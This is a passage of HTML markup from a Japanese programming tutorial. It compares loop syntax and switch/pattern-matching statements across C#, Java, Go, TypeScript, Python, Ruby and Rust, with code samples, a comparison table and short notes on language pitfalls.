class=\"n\">i</span><span class=\"o\">]);</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"go\" data-sourcepos=\"248:1-264:3\"><div class=\"highlight\"><pre><code><span class=\"c\">// Go - for range を使用（while も for で表現）</span>\n<span class=\"n\">items</span> <span class=\"o\">:=</span> <span class=\"p\">[]</span><span class=\"kt\">int</span><span class=\"p\">{</span><span class=\"m\">1</span><span class=\"p\">,</span> <span class=\"m\">2</span><span class=\"p\">,</span> <span class=\"m\">3</span><span class=\"p\">}</span>\n<span class=\"k\">for</span> <span class=\"n\">_</span><span class=\"p\">,</span> <span class=\"n\">item</span> <span class=\"o\">:=</span> <span class=\"k\">range</span> <span class=\"n\">items</span> <span class=\"p\">{</span>\n    <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Println</span><span class=\"p\">(</span><span class=\"n\">item</span><span class=\"p\">)</span>\n<span class=\"p\">}</span>\n\n<span class=\"c\">// インデックスも必要な場合</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">item</span> <span class=\"o\">:=</span> <span class=\"k\">range</span> <span class=\"n\">items</span> <span class=\"p\">{</span>\n    <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Printf</span><span class=\"p\">(</span><span class=\"s\">\"%d: %d</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">item</span><span class=\"p\">)</span>\n<span class=\"p\">}</span>\n\n<span class=\"c\">// 従来の for 文</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"o\">:=</span> <span class=\"m\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">items</span><span class=\"p\">);</span> <span class=\"n\">i</span><span class=\"o\">++</span> <span class=\"p\">{</span>\n    <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Println</span><span class=\"p\">(</span><span class=\"n\">items</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">])</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"266:1-280:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// TypeScript - for...of を使用</span>\n<span class=\"kd\">const</span> <span class=\"nx\">items</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">3</span><span class=\"p\">];</span>\n<span class=\"k\">for </span><span class=\"p\">(</span><span class=\"kd\">const</span> <span class=\"nx\">item</span> <span class=\"k\">of</span> <span class=\"nx\">items</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">item</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// 従来の for 文</span>\n<span class=\"k\">for </span><span class=\"p\">(</span><span class=\"kd\">let</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"nx\">items</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">items</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">]);</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// forEach メソッド</span>\n<span class=\"nx\">items</span><span class=\"p\">.</span><span class=\"nf\">forEach</span><span class=\"p\">(</span><span class=\"nx\">item</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">item</span><span class=\"p\">));</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"282:1-295:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Python - for...in を使用\n</span><span class=\"n\">items</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">3</span><span class=\"p\">]</span>\n<span class=\"k\">for</span> <span class=\"n\">item</span> <span class=\"ow\">in</span> <span class=\"n\">items</span><span class=\"p\">:</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">item</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># インデックスも必要な場合\n</span><span class=\"k\">for</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">item</span> <span class=\"ow\">in</span> <span class=\"nf\">enumerate</span><span class=\"p\">(</span><span class=\"n\">items</span><span class=\"p\">):</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"si\">{</span><span class=\"n\">i</span><span class=\"si\">}</span><span class=\"s\">: </span><span class=\"si\">{</span><span class=\"n\">item</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># range を使った繰り返し\n</span><span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nf\">range</span><span class=\"p\">(</span><span class=\"mi\">3</span><span class=\"p\">):</span>\n    <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">)</span>  <span class=\"c1\"># 0, 1, 2\n</span></code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"ruby\" data-sourcepos=\"297:1-314:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Ruby - each メソッドが主流</span>\n<span class=\"n\">items</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">3</span><span class=\"p\">]</span>\n<span class=\"n\">items</span><span class=\"p\">.</span><span class=\"nf\">each</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">item</span><span class=\"o\">|</span>\n  <span class=\"nb\">puts</span> <span class=\"n\">item</span>\n<span class=\"k\">end</span>\n\n<span class=\"c1\"># 1行で書く場合</span>\n<span class=\"n\">items</span><span class=\"p\">.</span><span class=\"nf\">each</span> <span class=\"p\">{</span> <span class=\"o\">|</span><span class=\"n\">item</span><span class=\"o\">|</span> <span class=\"nb\">puts</span> <span class=\"n\">item</span> <span class=\"p\">}</span>\n\n<span class=\"c1\"># インデックス付き</span>\n<span class=\"n\">items</span><span class=\"p\">.</span><span class=\"nf\">each_with_index</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">item</span><span class=\"p\">,</span> <span class=\"n\">i</span><span class=\"o\">|</span>\n  <span class=\"nb\">puts</span> <span class=\"s2\">\"</span><span class=\"si\">#{</span><span class=\"n\">i</span><span class=\"si\">}</span><span class=\"s2\">: </span><span class=\"si\">#{</span><span class=\"n\">item</span><span class=\"si\">}</span><span class=\"s2\">\"</span>\n<span class=\"k\">end</span>\n\n<span class=\"c1\"># 回数指定の繰り返し</span>\n<span class=\"mi\">3</span><span class=\"p\">.</span><span class=\"nf\">times</span> <span class=\"p\">{</span> <span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span> <span class=\"nb\">puts</span> <span class=\"n\">i</span> <span class=\"p\">}</span>  <span class=\"c1\"># 0, 1, 2</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"rust\" data-sourcepos=\"316:1-337:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// Rust - for...in を使用</span>\n<span class=\"k\">let</span> <span class=\"n\">items</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">3</span><span class=\"p\">];</span>\n<span class=\"k\">for</span> <span class=\"n\">item</span> <span class=\"k\">in</span> <span class=\"n\">items</span> <span class=\"p\">{</span>\n    <span class=\"nd\">println!</span><span class=\"p\">(</span><span class=\"s\">\"{}\"</span><span class=\"p\">,</span> <span class=\"n\">item</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// イテレータを明示的に使用</span>\n<span class=\"k\">for</span> <span class=\"n\">item</span> <span class=\"k\">in</span> <span class=\"n\">items</span><span class=\"nf\">.iter</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"nd\">println!</span><span class=\"p\">(</span><span class=\"s\">\"{}\"</span><span class=\"p\">,</span> <span class=\"n\">item</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// インデックス付き</span>\n<span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">item</span><span class=\"p\">)</span> <span class=\"k\">in</span> <span class=\"n\">items</span><span class=\"nf\">.iter</span><span class=\"p\">()</span><span class=\"nf\">.enumerate</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"nd\">println!</span><span class=\"p\">(</span><span class=\"s\">\"{}: {}\"</span><span class=\"p\">,</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">item</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// 範囲指定</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"k\">in</span> <span class=\"mi\">0</span><span class=\"o\">..</span><span class=\"mi\">3</span> <span class=\"p\">{</span>\n    <span class=\"nd\">println!</span><span class=\"p\">(</span><span class=\"s\">\"{}\"</span><span class=\"p\">,</span> <span class=\"n\">i</span><span class=\"p\">);</span>  <span class=\"c1\">// 0, 1, 2</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<h3 data-sourcepos=\"339:1-339:28\">\n<span id=\"ループ構文比較表\" class=\"fragment\"></span><a href=\"#%E3%83%AB%E3%83%BC%E3%83%97%E6%A7%8B%E6%96%87%E6%AF%94%E8%BC%83%E8%A1%A8\"><i class=\"fa fa-link\"></i></a>ループ構文比較表</h3>\n<table data-sourcepos=\"341:1-349:54\">\n<thead>\n<tr data-sourcepos=\"341:1-341:64\">\n<th data-sourcepos=\"341:2-341:9\">言語</th>\n<th data-sourcepos=\"341:11-341:27\">配列ループ</th>\n<th data-sourcepos=\"341:29-341:45\">キーワード</th>\n<th data-sourcepos=\"341:47-341:63\">while の代替</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"343:1-343:61\">\n<td data-sourcepos=\"343:2-343:5\">C#</td>\n<td data-sourcepos=\"343:7-343:32\"><code>foreach (var x in arr)</code></td>\n<td data-sourcepos=\"343:34-343:45\">foreach/in</td>\n<td data-sourcepos=\"343:47-343:60\">while あり</td>\n</tr>\n<tr data-sourcepos=\"344:1-344:68\">\n<td data-sourcepos=\"344:2-344:7\">Java</td>\n<td data-sourcepos=\"344:9-344:29\"><code>for (var x : arr)</code></td>\n<td data-sourcepos=\"344:31-344:52\">for/:（拡張for）</td>\n<td data-sourcepos=\"344:54-344:67\">while あり</td>\n</tr>\n<tr data-sourcepos=\"345:1-345:60\">\n<td data-sourcepos=\"345:2-345:5\">Go</td>\n<td data-sourcepos=\"345:7-345:31\"><code>for _, x := range arr</code></td>\n<td data-sourcepos=\"345:33-345:43\">for/range</td>\n<td data-sourcepos=\"345:45-345:59\">for で代用</td>\n</tr>\n<tr data-sourcepos=\"346:1-346:63\">\n<td data-sourcepos=\"346:2-346:13\">TypeScript</td>\n<td data-sourcepos=\"346:15-346:38\"><code>for (const x of arr)</code></td>\n<td data-sourcepos=\"346:40-346:47\">for/of</td>\n<td data-sourcepos=\"346:49-346:62\">while あり</td>\n</tr>\n<tr data-sourcepos=\"347:1-347:52\">\n<td data-sourcepos=\"347:2-347:9\">Python</td>\n<td data-sourcepos=\"347:11-347:27\"><code>for x in arr:</code></td>\n<td data-sourcepos=\"347:29-347:36\">for/in</td>\n<td data-sourcepos=\"347:38-347:51\">while あり</td>\n</tr>\n<tr data-sourcepos=\"348:1-348:66\">\n<td data-sourcepos=\"348:2-348:7\">Ruby</td>\n<td data-sourcepos=\"348:9-348:30\"><code>arr.each { |x| }</code></td>\n<td data-sourcepos=\"348:32-348:50\">each メソッド</td>\n<td data-sourcepos=\"348:52-348:65\">while あり</td>\n</tr>\n<tr data-sourcepos=\"349:1-349:54\">\n<td data-sourcepos=\"349:2-349:7\">Rust</td>\n<td data-sourcepos=\"349:9-349:24\"><code>for x in arr</code></td>\n<td data-sourcepos=\"349:26-349:33\">for/in</td>\n<td data-sourcepos=\"349:35-349:53\">loop/while あり</td>\n</tr>\n</tbody>\n</table>\n<h3 data-sourcepos=\"351:1-351:34\">\n<span id=\"各言語の特徴注意点-1\" class=\"fragment\"></span><a href=\"#%E5%90%84%E8%A8%80%E8%AA%9E%E3%81%AE%E7%89%B9%E5%BE%B4%E6%B3%A8%E6%84%8F%E7%82%B9-1\"><i class=\"fa fa-link\"></i></a>各言語の特徴・注意点</h3>\n<h4 data-sourcepos=\"353:1-353:27\">\n<span id=\"go-while-文がない\" class=\"fragment\"></span><a href=\"#go-while-%E6%96%87%E3%81%8C%E3%81%AA%E3%81%84\"><i class=\"fa fa-link\"></i></a>Go: while 文がない</h4>\n<div class=\"code-frame\" data-lang=\"go\" data-sourcepos=\"355:1-365:3\"><div class=\"highlight\"><pre><code><span class=\"c\">// while の代わりに for を使う</span>\n<span class=\"k\">for</span> <span class=\"n\">条件</span> <span class=\"p\">{</span>\n    <span class=\"c\">// 処理</span>\n<span class=\"p\">}</span>\n\n<span class=\"c\">// 無限ループ</span>\n<span class=\"k\">for</span> <span class=\"p\">{</span>\n    <span class=\"c\">// break で抜ける</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"367:1-367:29\">\n<span id=\"ruby-ループが豊富\" class=\"fragment\"></span><a href=\"#ruby-%E3%83%AB%E3%83%BC%E3%83%97%E3%81%8C%E8%B1%8A%E5%AF%8C\"><i class=\"fa fa-link\"></i></a>Ruby: ループが豊富</h4>\n<div class=\"code-frame\" data-lang=\"ruby\" data-sourcepos=\"369:1-375:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># times, upto, downto, step など多彩</span>\n<span class=\"mi\">5</span><span class=\"p\">.</span><span class=\"nf\">times</span> <span class=\"p\">{</span> <span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span> <span class=\"nb\">puts</span> <span class=\"n\">i</span> <span class=\"p\">}</span>        <span class=\"c1\"># 0, 1, 2, 3, 4</span>\n<span class=\"mi\">1</span><span class=\"p\">.</span><span class=\"nf\">upto</span><span class=\"p\">(</span><span class=\"mi\">5</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span> <span class=\"nb\">puts</span> <span class=\"n\">i</span> <span class=\"p\">}</span>      <span class=\"c1\"># 1, 2, 3, 4, 5</span>\n<span class=\"mi\">5</span><span class=\"p\">.</span><span class=\"nf\">downto</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span> <span class=\"nb\">puts</span> <span class=\"n\">i</span> <span class=\"p\">}</span>    <span class=\"c1\"># 5, 4, 3, 2, 1</span>\n<span class=\"mi\">0</span><span class=\"p\">.</span><span class=\"nf\">step</span><span class=\"p\">(</span><span class=\"mi\">10</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span> <span class=\"nb\">puts</span> <span class=\"n\">i</span> <span class=\"p\">}</span>  <span class=\"c1\"># 0, 2, 4, 6, 8, 10</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"377:1-377:29\">\n<span id=\"rust-範囲の書き方\" class=\"fragment\"></span><a href=\"#rust-%E7%AF%84%E5%9B%B2%E3%81%AE%E6%9B%B8%E3%81%8D%E6%96%B9\"><i class=\"fa fa-link\"></i></a>Rust: 範囲の書き方</h4>\n<div class=\"code-frame\" data-lang=\"rust\" data-sourcepos=\"379:1-382:3\"><div class=\"highlight\"><pre><code><span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"k\">in</span> <span class=\"mi\">0</span><span class=\"o\">..</span><span class=\"mi\">5</span> <span class=\"p\">{</span> <span class=\"p\">}</span>   <span class=\"c1\">// 0, 1, 2, 3, 4（5は含まない）</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"k\">in</span> <span class=\"mi\">0</span><span class=\"o\">..=</span><span class=\"mi\">5</span> <span class=\"p\">{</span> <span class=\"p\">}</span>  <span class=\"c1\">// 0, 1, 2, 3, 4, 5（5を含む）</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"384:1-384:48\">\n<span id=\"typescript-forin-と-forof-の違い\" class=\"fragment\"></span><a href=\"#typescript-forin-%E3%81%A8-forof-%E3%81%AE%E9%81%95%E3%81%84\"><i class=\"fa fa-link\"></i></a>TypeScript: for...in と for...of の違い</h4>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"386:1-398:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">arr</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"dl\">'</span><span class=\"s1\">a</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"dl\">'</span><span class=\"s1\">b</span><span class=\"dl\">'</span><span class=\"p\">,</span> <span class=\"dl\">'</span><span class=\"s1\">c</span><span class=\"dl\">'</span><span class=\"p\">];</span>\n\n<span class=\"c1\">// for...of は値を取得（配列向け）</span>\n<span class=\"k\">for </span><span class=\"p\">(</span><span class=\"kd\">const</span> <span class=\"nx\">value</span> <span class=\"k\">of</span> <span class=\"nx\">arr</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">value</span><span class=\"p\">);</span>  <span class=\"c1\">// 'a', 'b', 'c'</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// for...in はキー（インデックス）を取得（オブジェクト向け）</span>\n<span class=\"k\">for </span><span class=\"p\">(</span><span class=\"kd\">const</span> <span class=\"nx\">index</span> <span class=\"k\">in</span> <span class=\"nx\">arr</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">index</span><span class=\"p\">);</span>  <span class=\"c1\">// '0', '1', '2'（文字列！）</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div data-sourcepos=\"400:1-402:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"401:1-401:252\"><strong>TypeScript の罠</strong>: 配列に <code>for...in</code> を使うと、インデックスが<strong>文字列</strong>で取得され、プロトタイプチェーンのプロパティも列挙される可能性があります。配列には <code>for...of</code> を使いましょう。</p>\n</div>\n</div>\n<hr data-sourcepos=\"404:1-405:0\">\n<h2 data-sourcepos=\"406:1-406:46\">\n<span id=\"4-switch-文--パターンマッチング\" class=\"fragment\"></span><a href=\"#4-switch-%E6%96%87--%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3%E3%83%9E%E3%83%83%E3%83%81%E3%83%B3%E3%82%B0\"><i class=\"fa fa-link\"></i></a>4. switch 文 / パターンマッチング</h2>\n<h3 data-sourcepos=\"408:1-408:27\">\n<span id=\"基本的な-switch-文\" class=\"fragment\"></span><a href=\"#%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA-switch-%E6%96%87\"><i class=\"fa fa-link\"></i></a>基本的な switch 文</h3>\n<div class=\"code-frame\" data-lang=\"csharp\" data-sourcepos=\"410:1-431:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// C# - break が必須（フォールスルー防止）</span>\n<span class=\"k\">switch</span> <span class=\"p\">(</span><span class=\"k\">value</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">case</span> <span class=\"m\">1</span><span class=\"p\">:</span>\n        <span class=\"n\">Console</span><span class=\"p\">.</span><span class=\"nf\">WriteLine</span><span class=\"p\">(</span><span class=\"s\">\"One\"</span><span class=\"p\">);</span>\n        <span class=\"k\">break</span><span class=\"p\">;</span>\n    <span class=\"k\">case</span> <span class=\"m\">2</span><span class=\"p\">:</span>\n    <span class=\"k\">case</span> <span class=\"m\">3</span><span class=\"p\">:</span>\n        <span class=\"n\">Console</span><span class=\"p\">.</span><span class=\"nf\">WriteLine</span><span class=\"p\">(</span><span class=\"s\">\"Two or Three\"</span><span class=\"p\">);</span>\n        <span class=\"k\">break</span><span class=\"p\">;</span>\n    <span class=\"k\">default</span><span class=\"p\">:</span>\n        <span class=\"n\">Console</span><span class=\"p\">.</span><span class=\"nf\">WriteLine</span><span class=\"p\">(</span><span class=\"s\">\"Other\"</span><span class=\"p\">);</span>\n        <span class=\"k\">break</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// C# 8.0 以降の switch 式</span>\n<span class=\"kt\">var</span> <span class=\"n\">result</span> <span class=\"p\">=</span> <span class=\"k\">value</span> <span class=\"k\">switch</span> <span class=\"p\">{</span>\n    <span class=\"m\">1</span> <span class=\"p\">=&gt;</span> <span class=\"s\">\"One\"</span><span class=\"p\">,</span>\n    <span class=\"m\">2</span> <span class=\"n\">or</span> <span class=\"m\">3</span> <span class=\"p\">=&gt;</span> <span class=\"s\">\"Two or Three\"</span><span class=\"p\">,</span>\n    <span class=\"n\">_</span> <span class=\"p\">=&gt;</span> <span class=\"s\">\"Other\"</span>\n<span class=\"p\">};</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"433:1-454:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// Java - break が必要（忘れるとフォールスルー）</span>\n<span class=\"k\">switch</span> <span class=\"o\">(</span><span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">case</span> <span class=\"mi\">1</span><span class=\"o\">:</span>\n        <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"One\"</span><span class=\"o\">);</span>\n        <span class=\"k\">break</span><span class=\"o\">;</span>\n    <span class=\"k\">case</span> <span class=\"mi\">2</span><span class=\"o\">:</span>\n    <span class=\"k\">case</span> <span class=\"mi\">3</span><span class=\"o\">:</span>\n        <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"Two or Three\"</span><span class=\"o\">);</span>\n        <span class=\"k\">break</span><span class=\"o\">;</span>\n    <span class=\"k\">default</span><span class=\"o\">:</span>\n        <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"Other\"</span><span class=\"o\">);</span>\n        <span class=\"k\">break</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"c1\">// Java 14 以降の switch 式</span>\n<span class=\"kt\">var</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"k\">switch</span> <span class=\"o\">(</span><span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">case</span> <span class=\"mi\">1</span> <span class=\"o\">-&gt;</span> <span class=\"s\">\"One\"</span><span class=\"o\">;</span>\n    <span class=\"k\">case</span> <span class=\"mi\">2</span><span class=\"o\">,</span> <span class=\"mi\">3</span> <span class=\"o\">-&gt;</span> <span class=\"s\">\"Two or Three\"</span><span class=\"o\">;</span>\n    <span class=\"k\">default</span> <span class=\"o\">-&gt;</span> <span class=\"s\">\"Other\"</span><span class=\"o\">;</span>\n<span class=\"o\">};</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"go\" data-sourcepos=\"456:1-476:3\"><div class=\"highlight\"><pre><code><span class=\"c\">// Go - break 不要（自動で break）、fallthrough で明示的に継続</span>\n<span class=\"k\">switch</span> <span class=\"n\">value</span> <span class=\"p\">{</span>\n<span class=\"k\">case</span> <span class=\"m\">1</span><span class=\"o\">:</span>\n    <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Println</span><span class=\"p\">(</span><span class=\"s\">\"One\"</span><span class=\"p\">)</span>\n<span class=\"k\">case</span> <span class=\"m\">2</span><span class=\"p\">,</span> <span class=\"m\">3</span><span class=\"o\">:</span>\n    <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Println</span><span class=\"p\">(</span><span class=\"s\">\"Two or Three\"</span><span class=\"p\">)</span>\n<span class=\"k\">default</span><span class=\"o\">:</span>\n    <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Println</span><span class=\"p\">(</span><span class=\"s\">\"Other\"</span><span class=\"p\">)</span>\n<span class=\"p\">}</span>\n\n<span class=\"c\">// 条件式なしの switch</span>\n<span class=\"k\">switch</span> <span class=\"p\">{</span>\n<span class=\"k\">case</span> <span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"m\">0</span><span class=\"o\">:</span>\n    <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Println</span><span class=\"p\">(</span><span class=\"s\">\"Negative\"</span><span class=\"p\">)</span>\n<span class=\"k\">case</span> <span class=\"n\">value</span> <span class=\"o\">==</span> <span class=\"m\">0</span><span class=\"o\">:</span>\n    <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Println</span><span class=\"p\">(</span><span class=\"s\">\"Zero\"</span><span class=\"p\">)</span>\n<span class=\"k\">default</span><span class=\"o\">:</span>\n    <span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Println</span><span class=\"p\">(</span><span class=\"s\">\"Positive\"</span><span class=\"p\">)</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"478:1-491:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// TypeScript - break が必要</span>\n<span class=\"k\">switch </span><span class=\"p\">(</span><span class=\"nx\">value</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">case</span> <span class=\"mi\">1</span><span class=\"p\">:</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">One</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n        <span class=\"k\">break</span><span class=\"p\">;</span>\n    <span class=\"k\">case</span> <span class=\"mi\">2</span><span class=\"p\">:</span>\n    <span class=\"k\">case</span> <span class=\"mi\">3</span><span class=\"p\">:</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Two or Three</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n        <span class=\"k\">break</span><span class=\"p\">;</span>\n    <span class=\"nl\">default</span><span class=\"p\">:</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Other</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"493:1-502:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Python 3.10 以降の match 文\n</span><span class=\"k\">match</span> <span class=\"n\">value</span><span class=\"p\">:</span>\n    <span class=\"k\">case</span> <span class=\"mi\">1</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">One</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"k\">case</span> <span class=\"mi\">2</span> <span class=\"o\">|</span> <span class=\"mi\">3</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Two or Three</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"k\">case</span><span class=\"w\"> </span><span class=\"k\">_</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Other</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"ruby\" data-sourcepos=\"504:1-521:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># Ruby の case 文（break 不要）</span>\n<span class=\"k\">case</span> <span class=\"n\">value</span>\n<span class=\"k\">when</span> <span class=\"mi\">1</span>\n  <span class=\"nb\">puts</span> <span class=\"s2\">\"One\"</span>\n<span class=\"k\">when</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">3</span>\n  <span class=\"nb\">puts</span> <span class=\"s2\">\"Two or Three\"</span>\n<span class=\"k\">else</span>\n  <span class=\"nb\">puts</span> <span 